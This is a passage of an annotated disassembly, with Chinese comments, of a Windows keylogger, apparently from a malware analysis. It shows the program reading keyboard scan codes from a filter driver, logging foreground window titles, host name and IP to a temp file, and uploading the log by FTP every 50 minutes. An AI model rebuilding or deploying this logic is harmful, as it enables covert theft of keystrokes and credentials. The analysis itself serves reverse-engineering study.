
```
00402017  push    eax  
00402018  lea     ecx,[ebp-318]  
0040201E  push    ecx  
0040201F  call    [<&KERNEL32.lstrcatA>]                 ;  KERNEL32.lstrcatA  
00402025  push    004042F4  
0040202A  lea     edx,[ebp-318]                          ;  
00402030  push    edx  
00402031  call    [<&KERNEL32.lstrcatA>]                 ;  KERNEL32.lstrcatA  
00402037  lea     eax,[ebp-5A8]  
0040203D  push    eax  
0040203E  lea     ecx,[ebp-318]  
00402044  push    ecx  
00402045  call    004015A9                                ;  记录主机名及 IP  
0040204A  add     esp,8  
------------------------------------------------------------------------------------------
0040204D  call    [<&WS2_32.#116>]                        ;  WS2_32.WSACleanup 清除 Socket  
00402053  push    0  
00402055  push    80  
0040205A  push    3  
0040205C  push    0  
0040205E  push    0  
00402060  push    C0000000  
00402065  push    004042F8                                ;  ASCII "\\.kbdev"  
0040206A  call    [<&KERNEL32.CreateFileA>]               ;  KERNEL32.CreateFileA 建立与键盘过滤驱动的连接  
00402070  mov     [ebp-10],eax  
00402073  cmp     dword ptr [ebp-10],-1  
00402077  je      0040234C                                ;  连接失败则跳转  
0040207D  call    [<&KERNEL32.GetCurrentThreadId>]        ;  KERNEL32.GetCurrentThreadId 得到当前线程 ID  
00402083  mov     [ebp-398],eax  
00402089  call    [<&KERNEL32.GetTickCount>]              ;  KERNEL32.GetTickCount 得到启动到现在经历的毫秒数  
0040208F  mov     [ebp-388],eax  
00402095  mov     edx,1                                   ;  循环 while(TRUE) 至 00402347  
0040209A  test    edx,edx  
0040209C  je      0040234C                                ;  edx 为 0 则跳出循环  
004020A2  call    [<&USER32.GetForegroundWindow>]         ;  USER32.GetForegroundWindow 获得前端窗口句柄  
004020A8  mov     [ebp-AC4],eax                            ;  前端窗口句柄存于[ebp-AC4]  
004020AE  call    [<&USER32.GetFocus>]                    ;  USER32.GetFocus 获得前端焦点控件句柄  
004020B4  mov     [ebp-218],eax  
004020BA  call    [<&KERNEL32.GetTickCount>]              ;  KERNEL32.GetTickCount 得到启动到现在经历的毫秒数  
004020C0  mov     [ebp-6C0],eax  
004020C6  mov     eax,[ebp-6C0]  
004020CC  sub     eax,[ebp-388]                           ;  两次经历的时间差  
004020D2  cmp     eax,2DC6C0  
004020D7  jb      00402168                                ;  如果少于 50 分钟则跳转  
004020DD  lea     ecx,[ebp-5A8]                           ;  否则上传 ftp  
004020E3  push    ecx  
004020E4  call    00401719                                ;  
004020E9  add     esp,4  
004020EC  test    eax,eax  
004020EE  je      short 0040215C                          ;  上传失败则跳转  
------------------------------------------------------;  上传成功则初始化记录文件路径和----------------------
------------------------------------------------------;  临时文件名并重新记录主机名和 IP----------------------
004020F0  push    100  
004020F5  push    0  
004020F7  lea     edx,[ebp-6B0]  
004020FD  push    edx  
004020FE  call    <jmp.&MSVCRT.memset>  
00402103  add     esp,0C  
00402106  lea     eax,[ebp-6B0]  
0040210C  push    eax  
0040210D  push    100  
00402112  call    [<&KERNEL32.GetTempPathA>]              ;  KERNEL32.GetTempPathA  
00402118  push    100  
0040211D  push    0  
0040211F  lea     ecx,[ebp-5A8]  
00402125  push    ecx  
00402126  call    <jmp.&MSVCRT.memset>  
0040212B  add     esp,0C  
0040212E  lea     edx,[ebp-5A8]  
00402134  push    edx  
00402135  push    0  
00402137  push    0  
00402139  lea     eax,[ebp-6B0]                           ;  |Arg2 => 00404264 ASCII "kbdrv"  
0040213F  push    eax  
00402140  call    [<&KERNEL32.GetTempFileNameA>]          ;  KERNEL32.GetTempFileNameA  
00402146  lea     ecx,[ebp-5A8]  
0040214C  push    ecx  
0040214D  lea     edx,[ebp-318]  
00402153  push    edx  
00402154  call    004015A9  
00402159  add     esp,8  
------------------------------------------------------------------------------------------
0040215C  call    [<&KERNEL32.GetTickCount>]              ;  KERNEL32.GetTickCount 经历秒数  
00402162  mov     [ebp-388],eax  
00402168  mov     eax,[ebp-AC4]                           ;  前端的窗口句柄  
0040216E  cmp     eax,[ebp-6BC]                           ;  00402327 处记忆的原前端窗口句柄  
00402174  je      short 004021C5                          ;  两句柄比较相等则转(前端窗口没变)  
00402176  cmp     dword ptr [ebp-4A4],0  
0040217D  je      short 00402195                          ;  如[ebp-4A4]线程 ID 为空则跳转  
0040217F  push    0                                       ;  否则将当前线程绑定到前端窗口线程的输入  
00402181  mov     ecx,[ebp-4A4]  
00402187  push    ecx  
00402188  mov     edx,[ebp-398]  
0040218E  push    edx  
0040218F  call    [<&USER32.AttachThreadInput>]           ;  USER32.AttachThreadInput  
00402195  lea     eax,[ebp-5B0]  
0040219B  push    eax  
0040219C  mov     ecx,[ebp-AC4]  
004021A2  push    ecx  
004021A3  call    [<&USER32.GetWindowThreadProcessId>>;  得到前端窗口线程 ID  
004021A9  mov     [ebp-4A4],eax  
004021AF  push    1  
004021B1  mov     edx,[ebp-4A4]  
004021B7  push    edx  
004021B8  mov     eax,[ebp-398]  
004021BE  push    eax  
004021BF  call    [<&USER32.AttachThreadInput>]           ;  将当前线程绑定到前端窗口线程的输入  
004021C5  cmp     dword ptr [ebp-AC4],0  
004021CC  je      004022F9                                ;  如前端窗口句柄不空  
004021D2  push    100                                     ;  得到窗口名  
004021D7  push    00404564  
004021DC  mov     ecx,[ebp-AC4]  
004021E2  push    ecx  
004021E3  call    [<&USER32.GetWindowTextA>]              ;  USER32.GetWindowTextA  
004021E9  mov     edx,1  
004021EE  test    edx,edx  
004021F0  je      004022F9                                ;   
004021F6  mov     eax,[ebp-AC4]  
004021FC  cmp     eax,[ebp-6BC]  
00402202  jnz     short 0040223B                          ;  如前端窗口改变则跳转  
00402204  mov     ecx,[ebp-218]  
0040220A  cmp     ecx,[ebp-5AC]  
00402210  je      short 0040223B                          ;  如前端控件焦点没改变则跳转  
00402212  push    0  
00402214  lea     edx,[ebp-39C]  
0040221A  push    edx                                     ;  
0040221B  push    0  
0040221D  push    0  
0040221F  push    0  
00402221  push    0  
00402223  push    80102187                                ;  IoControlCode 控制码  
00402228  mov     eax,[ebp-10]                             ; /Buffer  
0040222B  push    eax  
0040222C  call    [<&KERNEL32.DeviceIoControl>]           ;  发 IO 请求，扫描码中加入换行标志  
00402232  test    eax,eax  
00402234  jnz     short 0040223B                          ;  请求成功则跳转  
00402236  jmp     0040234C                                ;  否则跳转  
0040223B  mov     ecx,[ebp-AC4]                           
00402241  cmp     ecx,[ebp-6BC]                           
00402247  je      004022F9                                ;  如前端窗口没改变则跳转  
0040224D  push    0                                       ;  否则发送驱动 IO 请求  
0040224F  lea     edx,[ebp-39C]  
00402255  push    edx                                     ;  
00402256  push    400  
0040225B  lea     eax,[ebp-AC0]                           
00402261  push    eax  
00402262  push    400  
00402267  lea     ecx,[ebp-AC0]  
0040226D  push    ecx  
0040226E  push    80102184  
00402273  mov     edx,[ebp-10]  
00402276  push    edx  
00402277  call    [<&KERNEL32.DeviceIoControl>]           ;  发 IO 请求，从驱动中返回的键盘扫描码数据  
0040227D  test    eax,eax  
0040227F  jnz     short 00402286                          ;  请求成功则跳转  
00402281  jmp     0040234C                                ;  否则跳转  
00402286  mov     eax,[ebp-AC0]                           ;  返回数据保存在：[ebp-AC0]  
0040228C  and     eax,0FFFF  
00402291  test    eax,eax  
00402293  je      short 004022F9                          ;  如返回的键盘数据为空(第一个值为 0)  
00402295  lea     ecx,[ebp-5A8]  
0040229B  push    ecx  
0040229C  push    00404664  
004022A1  call    004015A9                                ;  存原窗口名到记录文件  
004022A6  add     esp,8  
004022A9  lea     edx,[ebp-5A8]  
004022AF  push    edx  
```
